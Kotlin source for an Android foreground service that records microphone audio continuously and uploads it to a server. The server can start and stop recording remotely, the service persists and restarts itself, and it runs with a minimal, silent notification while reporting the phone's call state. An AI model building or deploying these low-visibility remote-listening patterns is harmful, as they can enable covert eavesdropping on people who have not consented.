package com.audiostream.client

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.io.RandomAccessFile
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * AudioRecordService.kt — Foreground service for continuous audio recording.
 *
 * This is the heart of the system. It:
 *   1. Records audio continuously via AudioRecord (16kHz, 16-bit, Mono)
 *   2. Splits recordings into WAV chunks (default 10 seconds)
 *   3. Saves each chunk locally with UUID, timestamp, checksum
 *   4. Enqueues chunks for upload via UploadManager
 *   5. Continues recording regardless of network/upload status
 *   6. Updates the foreground notification with live stats
 *
 * CRITICAL GUARANTEE: Recording NEVER stops due to network issues.
 * The recording loop and upload loop are completely independent.
 */

class AudioRecordService : Service() {

    companion object {
        const val ACTION_START = "ACTION_START"
        const val ACTION_STOP = "ACTION_STOP"
        const val ACTION_STANDBY = "ACTION_STANDBY"
        const val ACTION_STATE_UPDATE = "ACTION_STATE_UPDATE"
        const val ACTION_LOG = "ACTION_LOG"

        const val EXTRA_SERVER_URL = "server_url"
        const val EXTRA_PENDING = "pending"
        const val EXTRA_RETRIES = "retries"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_CONNECTION = "connection"
        const val EXTRA_MESSAGE = "message"
        const val EXTRA_STORAGE = "storage"

        const val CHANNEL_ID = "audio_monitor_channel"
        const val NOTIFICATION_ID = 1

        // Audio format (must match server: 16kHz, Mono, 16-bit PCM)
        const val SAMPLE_RATE = 16000
        const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        const val BYTES_PER_SAMPLE = 2
        const val BYTE_RATE = SAMPLE_RATE * BYTES_PER_SAMPLE  // 32000 bytes/sec

        // Default chunk duration
        const val DEFAULT_CHUNK_SECONDS = 10

        // Keep track of running state
        @Volatile
        var isRunning = false
            private set
            
        @Volatile
        var isStandbyMode = false
    }

    // Recording
    private var audioRecord: AudioRecord? = null
    private val isRecording = AtomicBoolean(false)
    private var recordingThread: Thread? = null
    private var chunkDurationSeconds = DEFAULT_CHUNK_SECONDS
    private var totalRecordingSeconds = 0L

    // Managers
    private var uploadManager: UploadManager? = null
    private var connectionMonitor: ConnectionMonitor? = null
    private var storageManager: StorageManager? = null

    // System
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Config
    private var serverUrl = ""
    private var clientName = ""
    private var deviceInfo = ""

    // Stats for notification
    private var pendingUploads = 0
    private var totalRetries = 0
    private var connectionState = "Idle"

    // Telemetry Cache
    private var currentBatteryPct = -1
    private var currentStorageMB = -1L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) {
            // Android OS restarted the service after process termination (START_STICKY)
            val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
            val wasRunning = prefs.getBoolean("was_running", false)
            val savedUrl = prefs.getString("server_url", null)
            if (wasRunning && !savedUrl.isNullOrEmpty()) {
                startMonitoring(savedUrl)
            }
        } else {
            when (intent.action) {
                ACTION_START -> {
                    val url = intent.getStringExtra(EXTRA_SERVER_URL) ?: return START_NOT_STICKY
                    startMonitoring(url, isStandby = false)
                }
                ACTION_STANDBY -> {
                    val url = intent.getStringExtra(EXTRA_SERVER_URL) ?: return START_NOT_STICKY
                    startMonitoring(url, isStandby = true)
                }
                ACTION_STOP -> {
                    stopMonitoring()
                }
            }
        }
        // START_STICKY ensures Android restarts the service if killed
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopMonitoring()
    }

    // ══════════════════════════════════════════════════════════════════════
    // SERVICE LIFECYCLE
    // ══════════════════════════════════════════════════════════════════════

    private var batteryReceiver: android.content.BroadcastReceiver? = null

    private fun registerBatteryListener() {
        val filter = android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        batteryReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                intent?.let { updateBatteryFromIntent(it) }
            }
        }
        registerReceiver(batteryReceiver, filter)
    }

    private fun updateBatteryFromIntent(intent: Intent) {
        val status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)
        val isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                         status == android.os.BatteryManager.BATTERY_STATUS_FULL
        val level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
        val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
        val pct = if (level >= 0 && scale > 0) (level * 100 / scale.toFloat()).toInt() else -1
        currentBatteryPct = pct
        val icon = if (isCharging) "⚡" else "🔋"
        val stateStr = if (isCharging) "Charging" else "Discharging"
        val batteryStatus = if (pct >= 0) "$icon $pct% ($stateStr)" else "$icon Unknown"
        val newDeviceInfo = "${Build.MANUFACTURER} ${Build.MODEL} | $batteryStatus"

        if (newDeviceInfo != deviceInfo) {
            deviceInfo = newDeviceInfo
            uploadManager?.updateDeviceInfo(newDeviceInfo)
        }
    }

    private fun startMonitoring(url: String, isStandby: Boolean = false) {
        if (isRunning || isStandbyMode) return

        serverUrl = url

        // Generate client name and include battery level & charging state in device info
        clientName = generateClientName()
        deviceInfo = "${Build.MANUFACTURER} ${Build.MODEL} | 🔋 Initializing..."

        // 1. Create notification channel and start foreground
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification(if (isStandby) "Standby mode..." else "Starting..."))

        // 2. Acquire wake lock (4 hour max, renewed on each chunk)
        acquireWakeLock()

        // 3. Initialize managers
        storageManager = StorageManager(this)

        connectionMonitor = ConnectionMonitor(
            context = this,
            serverUrl = serverUrl,
            onStateChange = { state -> onConnectionStateChanged(state) },
            onLog = { msg -> sendLog(msg) }
        )

        uploadManager = UploadManager(
            context = this,
            serverUrl = serverUrl,
            clientName = clientName,
            deviceInfo = deviceInfo,
            connectionMonitor = connectionMonitor!!,
            storageManager = storageManager!!,
            onLog = { msg -> sendLog(msg) },
            onStatsUpdate = { pending, retries -> onUploadStatsUpdate(pending, retries) }
        )

        // Register dynamic battery listener
        registerBatteryListener()

        // 4. Start everything or standby
        if (isStandby) {
            isStandbyMode = true
            isRunning = false
            sendLog("Standby mode enabled. Listening for commands...")
        } else {
            isStandbyMode = false
            isRunning = true
            connectionMonitor!!.start()
            uploadManager!!.start()
            startRecording()
            sendLog("Service started. Client: $clientName")
        }

        // 5. Clean up any temp files from previous sessions
        storageManager!!.cleanupTempFiles()

        // 6. Start loops
        startNotificationUpdater()
        startCommandPolling()
        startTelemetryPolling()

        broadcastStateUpdate()
    }

    private var isPolling = false
    private var telemetryJob: Job? = null

    private fun startTelemetryPolling() {
        telemetryJob?.cancel()
        telemetryJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                currentStorageMB = (storageManager?.getAvailableSpace() ?: 0L) / (1024 * 1024)
                delay(60000L) // Poll every 60 seconds
            }
        }
    }

    private fun startCommandPolling() {
        if (isPolling) return
        isPolling = true
        serviceScope.launch(Dispatchers.IO) {
            val httpClient = OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .build()

            while (isPolling) {
                try {
                    val encodedClientName = java.net.URLEncoder.encode(clientName, "UTF-8")
                    val status = if (isRunning) "recording" else "idle"
                    val endpoint = "${serverUrl.trimEnd('/')}/api/v1/broadcasts/command?client_id=$encodedClientName&status=$status"
                    
                    val request = Request.Builder().url(endpoint).get().build()
            
                    httpClient.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            val body = response.body?.string()
                            if (body != null) {
                                val json = JSONObject(body)
                                val command = json.optString("command", "NONE")
                                val startTime = json.optString("start_time", "")
                                val stopTime = json.optString("stop_time", "")
                                
                                syncAlarm(startTime, ACTION_START, 101)
                                syncAlarm(stopTime, ACTION_STANDBY, 102)
                                
                                var processed = false
                                if (command == "START" && !isRunning) {
                                    switchToRecording()
                                    processed = true
                                } else if (command == "STOP" && isRunning) {
                                    switchToStandby()
                                    processed = true
                                }
                                
                                // Acknowledge the command so the server clears it
                                if (processed) {
                                    try {
                                        val jsonBody = JSONObject().put("client_id", clientName).put("command", command).toString()
                                        val ackBody = jsonBody.toRequestBody("application/json".toMediaType())
                                        val ackRequest = Request.Builder()
                                            .url("${serverUrl.trimEnd('/')}/api/v1/broadcasts/command/ack")
                                            .post(ackBody)
                                            .build()
                                        httpClient.newCall(ackRequest).execute().close()
                                        sendLog("Command ACK sent for: $command")
                                    } catch (e: Exception) {
                                        sendLog("Failed to ACK command: ${e.message}")
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    // Ignore transient network errors
                }
                delay(15000L) // Poll every 15 seconds
            }
        }
    }

    private fun syncAlarm(timeStr: String, actionToTrigger: String, requestCode: Int) {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        val intent = Intent(this, AlarmReceiver::class.java).apply {
            action = actionToTrigger
            putExtra(AlarmReceiver.EXTRA_ACTION, actionToTrigger)
            putExtra(AlarmReceiver.EXTRA_SERVER_URL, serverUrl)
        }
        val pendingIntent = PendingIntent.getBroadcast(
            this, 
            requestCode, 
            intent, 
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        if (timeStr.isBlank()) {
            alarmManager.cancel(pendingIntent)
            return
        }

        try {
            val parts = timeStr.split(":")
            if (parts.size >= 2) {
                val cal = Calendar.getInstance().apply {
                    set(Calendar.HOUR_OF_DAY, parts[0].toInt())
                    set(Calendar.MINUTE, parts[1].toInt())
                    set(Calendar.SECOND, 0)
                    set(Calendar.MILLISECOND, 0)
                }

                if (cal.timeInMillis <= System.currentTimeMillis()) {
                    cal.add(Calendar.DAY_OF_YEAR, 1) // next occurrence
                }

                alarmManager.setExactAndAllowWhileIdle(
                    android.app.AlarmManager.RTC_WAKEUP,
                    cal.timeInMillis,
                    pendingIntent
                )
            }
        } catch (e: Exception) {
            sendLog("Error syncing alarm: ${e.message}")
        }
    }

    private fun switchToRecording() {
        isStandbyMode = false
        isRunning = true
        recordingStartTimeMs = System.currentTimeMillis()
        totalRecordingSeconds = 0L
        connectionMonitor?.start()
        uploadManager?.start()
        startRecording()
        startNotificationUpdater()
        updateNotification()
        sendLog("Remote command received: START")
        broadcastStateUpdate()
    }

    private fun switchToStandby() {
        isStandbyMode = true
        isRunning = false
        
        // Stop recording immediately
        isRecording.set(false)
        try {
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (e: Exception) { /* ignore */ }
        
        val threadToJoin = recordingThread
        recordingThread = null
        serviceScope.launch(Dispatchers.IO) {
            try {
                threadToJoin?.interrupt()
                threadToJoin?.join(1000)
            } catch (e: Exception) { /* ignore */ }
        }
        
        // Cancel the notification updater since we're switching to standby stats loop
        notificationUpdaterJob?.cancel()
        notificationUpdaterJob = null
        telemetryJob?.cancel()
        telemetryJob = null
        
        uploadManager?.stop()
        connectionMonitor?.stop()
        
        // Update foreground notification to reflect standby state
        updateNotification()
        
        sendLog("Remote command received: STOP")
        broadcastStateUpdate()
    }

    private fun stopMonitoring() {
        if (!isRunning && !isStandbyMode) return
        isRunning = false
        isStandbyMode = false
        isPolling = false

        sendLog("Stopping service completely...")

        // Stop recording flag and release AudioRecord FIRST to unblock read() call immediately
        isRecording.set(false)
        try {
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (e: Exception) { /* ignore */ }

        // Join recording thread asynchronously in background so Main thread never lags
        val threadToJoin = recordingThread
        recordingThread = null
        serviceScope.launch(Dispatchers.IO) {
            try {
                threadToJoin?.interrupt()
                threadToJoin?.join(1000)
            } catch (e: Exception) { /* ignore */ }
        }

        // Stop managers
        uploadManager?.stop()
        connectionMonitor?.stop()

        // Unregister battery receiver
        try {
            batteryReceiver?.let { unregisterReceiver(it) }
            batteryReceiver = null
        } catch (e: Exception) { /* ignore */ }

        // Release wake lock
        releaseWakeLock()

        // Cancel coroutines after cleanup
        serviceScope.coroutineContext.cancelChildren()

        // Stop foreground
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()

        sendLog("Service stopped")
        broadcastStateUpdate()
    }

    // ══════════════════════════════════════════════════════════════════════
    // AUDIO RECORDING
    // ══════════════════════════════════════════════════════════════════════

    private fun startRecording() {
        try {
            val minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
            val bufferSize = maxOf(minBuf, 4096)

            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                bufferSize
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                sendLog("ERROR: Failed to initialize AudioRecord. Microphone in use?")
                stopMonitoring()
                return
            }

            isRecording.set(true)
            audioRecord!!.startRecording()

            recordingThread = Thread({
                recordingLoop()
            }, "AudioRecordThread").apply {
                priority = Thread.MAX_PRIORITY
                start()
            }

            sendLog("Recording started (16kHz, Mono, 16-bit)")

        } catch (e: SecurityException) {
            sendLog("ERROR: Microphone permission denied")
            stopMonitoring()
        } catch (e: Exception) {
            sendLog("ERROR: Recording init failed: ${e.message}")
            stopMonitoring()
        }
    }

    /**
     * Main recording loop — runs on a dedicated thread.
     *
     * Continuously records audio and splits into WAV chunks.
     * This loop NEVER stops for network issues — it only cares
     * about the microphone and local storage.
     */
    private var recordingStartTimeMs: Long = 0L

    private fun calculateRMS(pcmData: ByteArray, length: Int): Double {
        var sum = 0.0
        val sampleCount = length / 2
        if (sampleCount <= 0) return -100.0
        var i = 0
        while (i < length - 1) {
            val low = pcmData[i].toInt() and 0xFF
            val high = pcmData[i + 1].toInt()
            val sample = (high shl 8) or low
            val shortSample = sample.toShort()
            sum += (shortSample.toDouble() * shortSample.toDouble())
            i += 2
        }
        val rms = Math.sqrt(sum / sampleCount)
        return if (rms > 0) 20 * Math.log10(rms / 32767.0) else -100.0
    }

    private fun recordingLoop() {
        val chunkBytes = BYTE_RATE * chunkDurationSeconds  // bytes per chunk
        val readBuffer = ByteArray(4096)
        var chunkBuffer = ByteArray(chunkBytes)
        var chunkPos = 0
        var consecutiveSilentChunks = 0

        recordingStartTimeMs = System.currentTimeMillis()
        sendLog("Recording loop started (chunk size: ${chunkBytes / 1024} KB)")

        while (isRecording.get() && !Thread.interrupted()) {
            try {
                val bytesRead = audioRecord?.read(readBuffer, 0, readBuffer.size) ?: -1

                if (bytesRead > 0) {
                    // Copy bytes into chunk buffer
                    val bytesToCopy = minOf(bytesRead, chunkBytes - chunkPos)
                    System.arraycopy(readBuffer, 0, chunkBuffer, chunkPos, bytesToCopy)
                    chunkPos += bytesToCopy

                    // Check if chunk is full
                    if (chunkPos >= chunkBytes) {
                        val rmsDb = calculateRMS(chunkBuffer, chunkPos)
                        val isSilent = rmsDb < -50.0 // Silence threshold -50 dB

                        if (isSilent) {
                            consecutiveSilentChunks++
                            // Save periodic keep-alive chunk every 6 chunks (~60s) even during silence
                            if (consecutiveSilentChunks % 6 == 0) {
                                sendLog("Silence detected (%.1f dB) — sending periodic keep-alive chunk".format(rmsDb))
                                saveChunk(chunkBuffer, chunkPos)
                            } else {
                                sendLog("Silence detected (%.1f dB) — skipped chunk save".format(rmsDb))
                            }
                        } else {
                            consecutiveSilentChunks = 0
                            saveChunk(chunkBuffer, chunkPos)
                        }

                        // Start new chunk
                        chunkBuffer = ByteArray(chunkBytes)
                        chunkPos = 0

                        // If there were extra bytes, copy them to new chunk
                        if (bytesToCopy < bytesRead) {
                            val remaining = bytesRead - bytesToCopy
                            System.arraycopy(readBuffer, bytesToCopy, chunkBuffer, 0, remaining)
                            chunkPos = remaining
                        }

                        // Check storage health
                        checkStorage()
                    }
                } else if (bytesRead < 0) {
                    sendLog("AudioRecord read error: $bytesRead")
                    // Try to recover by waiting briefly
                    Thread.sleep(100)
                }

            } catch (e: InterruptedException) {
                // Service is stopping — save any partial chunk
                if (chunkPos > 0) {
                    sendLog("Saving partial chunk ($chunkPos bytes)")
                    saveChunk(chunkBuffer, chunkPos)
                }
                break
            } catch (e: Exception) {
                sendLog("Recording error: ${e.message}")
                Thread.sleep(500)
            }
        }

        // Save any remaining data in buffer
        if (chunkPos > 0 && isRecording.get()) {
            saveChunk(chunkBuffer, chunkPos)
        }

        sendLog("Recording loop ended")
    }

    private fun isPhoneInCall(): Boolean {
        return try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
            val state = tm?.callState ?: android.telephony.TelephonyManager.CALL_STATE_IDLE
            state != android.telephony.TelephonyManager.CALL_STATE_IDLE
        } catch (e: Exception) {
            false
        }
    }

    private fun isMicUsedByExternalApp(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                val am = getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
                val configs = am?.activeRecordingConfigurations ?: emptyList()
                configs.any { it.clientAudioSessionId != audioRecord?.audioSessionId }
            } catch (e: Exception) {
                false
            }
        } else {
            false
        }
    }

    /**
     * Compress PCM buffer to AAC (16 kbps) using hardware MediaCodec and save as .aac file.
     */
    private fun saveChunk(pcmData: ByteArray, dataSize: Int) {
        try {
            val uuid = UUID.randomUUID().toString()
            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
            val duration = dataSize.toDouble() / BYTE_RATE

            // 1-Hour Session Rotation Check
            if (System.currentTimeMillis() - recordingStartTimeMs >= 3600_000L) {
                sendLog("1 hour recording duration reached — rotating session on server")
                uploadManager?.rotateSession()
                recordingStartTimeMs = System.currentTimeMillis()
            }

            // Phase 3: Enforce Storage Limit
            storageManager?.enforceStorageLimit()

            // Create AAC file
            val chunksDir = storageManager?.getChunksDirectory() ?: return
            
            // Phase 4: Telemetry in Segment Names
            val telemetrySuffix = "_B${currentBatteryPct}_S${currentStorageMB}"
            val aacFile = File(chunksDir, "chunk_${System.currentTimeMillis()}${telemetrySuffix}.aac")
            
            // Update timestamp to include telemetry for the server HLS generation
            val timestampWithTelemetry = timestamp + telemetrySuffix

            // Encode PCM to AAC
            encodePcmToAac(pcmData, dataSize, aacFile)

            // Compute checksum
            val checksum = computeSha256(aacFile)
            val inCall = isPhoneInCall()
            val micInUse = isMicUsedByExternalApp()

            // Create chunk record
            val chunk = AudioChunk(
                uuid = uuid,
                filePath = aacFile.absolutePath,
                timestamp = timestampWithTelemetry,
                duration = duration,
                fileSize = aacFile.length(),
                checksum = checksum,
                inCall = inCall,
                micInUse = micInUse
            )

            // Enqueue for upload (runs on coroutine)
            serviceScope.launch {
                uploadManager?.enqueueChunk(chunk)
            }

        } catch (e: Exception) {
            sendLog("ERROR saving AAC chunk: ${e.message}")
        }
    }

    private fun encodePcmToAac(pcmData: ByteArray, dataSize: Int, outFile: File) {
        val codec = MediaCodec.createEncoderByType("audio/mp4a-latm")
        val format = MediaFormat.createAudioFormat("audio/mp4a-latm", SAMPLE_RATE, 1).apply {
            setInteger(MediaFormat.KEY_AAC_PROFILE, MediaCodecInfo.CodecProfileLevel.AACObjectLC)
            setInteger(MediaFormat.KEY_BIT_RATE, 16000) // 16 kbps Ultra-Low Bandwidth
        }
        codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        codec.start()

        FileOutputStream(outFile).use { fos ->
            var inputOffset = 0
            var isEOS = false
            val bufferInfo = MediaCodec.BufferInfo()

            while (!isEOS || (bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) == 0) {
                if (!isEOS) {
                    val inputBufferIndex = codec.dequeueInputBuffer(10000)
                    if (inputBufferIndex >= 0) {
                        val inputBuffer = codec.getInputBuffer(inputBufferIndex)!!
                        val capacity = inputBuffer.capacity()
                        val bytesToFeed = minOf(dataSize - inputOffset, capacity)

                        if (bytesToFeed > 0) {
                            inputBuffer.put(pcmData, inputOffset, bytesToFeed)
                            inputOffset += bytesToFeed
                            codec.queueInputBuffer(inputBufferIndex, 0, bytesToFeed, 0, 0)
                        } else {
                            codec.queueInputBuffer(inputBufferIndex, 0, 0, 0, MediaCodec.BUFFER_FLAG_END_OF_STREAM)
                            isEOS = true
                        }
                    }
                }

                var outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
                while (outputBufferIndex >= 0) {
                    val outputBuffer = codec.getOutputBuffer(outputBufferIndex)!!
                    if ((bufferInfo.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
                        bufferInfo.size = 0
                    }
                    if (bufferInfo.size > 0) {
                        outputBuffer.position(bufferInfo.offset)
                        outputBuffer.limit(bufferInfo.offset + bufferInfo.size)

                        // Add ADTS header for AAC chunk
                        val packetLen = bufferInfo.size + 7
                        val adtsHeader = ByteArray(7)
                        addAdtsHeader(adtsHeader, packetLen)
                        fos.write(adtsHeader)

                        val data = ByteArray(bufferInfo.size)
                        outputBuffer.get(data)
                        fos.write(data)
                    }
                    codec.releaseOutputBuffer(outputBufferIndex, false)

                    if ((bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
                        break
                    }
                    outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
                }
            }
            fos.flush()
            fos.fd.sync()
        }
        codec.stop()
        codec.release()
    }

    private fun addAdtsHeader(packet: ByteArray, packetLen: Int) {
        val profile = 2 // AAC LC
        val freqIdx = 8 // 16kHz (Sampling frequency index for 16000Hz is 8)
        val chanCfg = 1 // Mono

        packet[0] = 0xFF.toByte()
        packet[1] = 0xF9.toByte()
        packet[2] = (((profile - 1) shl 6) + (freqIdx shl 2) + (chanCfg shr 2)).toByte()
        packet[3] = (((chanCfg and 3) shl 6) + (packetLen shr 11)).toByte()
        packet[4] = ((packetLen and 0x7FF) shr 3).toByte()
        packet[5] = (((packetLen and 7) shl 5) + 0x1F).toByte()
        packet[6] = 0xFC.toByte()
    }

    /**
     * Compute SHA-256 checksum of a file.
     */
    private fun computeSha256(file: File): String {
        val digest = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var read: Int
            while (input.read(buffer).also { read = it } != -1) {
                digest.update(buffer, 0, read)
            }
        }
        return digest.digest().joinToString("") { "%02x".format(it) }
    }

    // ══════════════════════════════════════════════════════════════════════
    // STORAGE HEALTH
    // ══════════════════════════════════════════════════════════════════════

    private fun checkStorage() {
        val health = storageManager?.checkStorageHealth() ?: "ok"
        when (health) {
            "critical" -> sendLog("⚠️ CRITICAL: Storage very low! < 100 MB free")
            "warning" -> sendLog("⚠️ Storage low: < 500 MB free")
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // CLIENT NAME GENERATION
    // ══════════════════════════════════════════════════════════════════════

    private fun generateClientName(): String {
        // Check if we have a saved name
        val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        val saved = prefs.getString("client_name", null)
        if (saved != null) return saved

        // Generate from device info
        val manufacturer = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model = Build.MODEL.replace(" ", "-")
        val name = "$manufacturer-$model"

        // Save for future use
        prefs.edit().putString("client_name", name).apply()
        return name
    }

    // ══════════════════════════════════════════════════════════════════════
    // CALLBACKS
    // ══════════════════════════════════════════════════════════════════════

    private fun onConnectionStateChanged(state: ConnectionState) {
        connectionState = when (state) {
            ConnectionState.CONNECTED -> "Connected"
            ConnectionState.DISCONNECTED -> "Disconnected"
            ConnectionState.RECONNECTING -> "Reconnecting"
            ConnectionState.WAITING -> "Waiting"
            ConnectionState.CONNECTING -> "Connecting"
            ConnectionState.ERROR -> "Error"
            ConnectionState.STOPPED -> "Stopped"
            ConnectionState.IDLE -> "Idle"
        }
        broadcastStateUpdate()
        updateNotification()
    }

    private fun onUploadStatsUpdate(pending: Int, retries: Int) {
        pendingUploads = pending
        totalRetries = retries
        broadcastStateUpdate()
        updateNotification()
    }

    // ══════════════════════════════════════════════════════════════════════
    // NOTIFICATIONS
    // ══════════════════════════════════════════════════════════════════════

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Audio Monitor",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Continuous audio recording and upload service"
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(status: String): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE
        )

        // Stop action
        val stopIntent = Intent(this, AudioRecordService::class.java).apply {
            action = ACTION_STOP
        }
        val stopPendingIntent = PendingIntent.getService(
            this, 1, stopIntent, PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Audio Monitor")
            .setContentText("Active in background")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pendingIntent)
            .addAction(android.R.drawable.ic_media_pause, "Stop", stopPendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun updateNotification() {
        if (!isRunning && !isStandbyMode) return
        try {
            val status = if (isRunning) connectionState else "Standby"
            val manager = getSystemService(NotificationManager::class.java)
            manager.notify(NOTIFICATION_ID, buildNotification(status))
        } catch (e: Exception) {
            // Non-critical
        }
    }

    private var notificationUpdaterJob: Job? = null

    private fun startNotificationUpdater() {
        // Cancel any existing updater before starting a new one
        notificationUpdaterJob?.cancel()
        notificationUpdaterJob = serviceScope.launch {
            while (isActive && (isRunning || isStandbyMode)) {
                delay(1000)  // Broadcast live stats to in-app UI every second
                if (isRunning && recordingStartTimeMs > 0) {
                    totalRecordingSeconds = (System.currentTimeMillis() - recordingStartTimeMs) / 1000
                }
                withContext(Dispatchers.Main) {
                    broadcastStateUpdate()
                }
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // BROADCASTS TO UI
    // ══════════════════════════════════════════════════════════════════════

    private fun broadcastStateUpdate() {
        val intent = Intent(ACTION_STATE_UPDATE).apply {
            setPackage(packageName)
            putExtra(EXTRA_PENDING, pendingUploads)
            putExtra(EXTRA_RETRIES, totalRetries)
            putExtra(EXTRA_DURATION, totalRecordingSeconds)
            putExtra(EXTRA_CONNECTION, connectionState)
            putExtra(EXTRA_STORAGE, storageManager?.getStorageSummary() ?: "")
        }
        sendBroadcast(intent)
    }

    private fun sendLog(message: String) {
        val intent = Intent(ACTION_LOG).apply {
            setPackage(packageName)
            putExtra(EXTRA_MESSAGE, message)
        }
        sendBroadcast(intent)
    }

    // ══════════════════════════════════════════════════════════════════════
    // WAKE LOCK
    // ══════════════════════════════════════════════════════════════════════

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "AudioMonitor::RecordingWakelock"
        ).apply {
            setReferenceCounted(false)
            acquire(24 * 60 * 60 * 1000L)  // 24 hours CPU hold
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (e: Exception) { /* ignore */ }
        wakeLock = null
    }

    // ══════════════════════════════════════════════════════════════════════
    // HELPERS
    // ══════════════════════════════════════════════════════════════════════

    private fun formatDuration(seconds: Long): String {
        val h = seconds / 3600
        val m = (seconds % 3600) / 60
        val s = seconds % 60
        return if (h > 0) String.format("%02d:%02d:%02d", h, m, s)
        else String.format("%02d:%02d", m, s)
    }
}
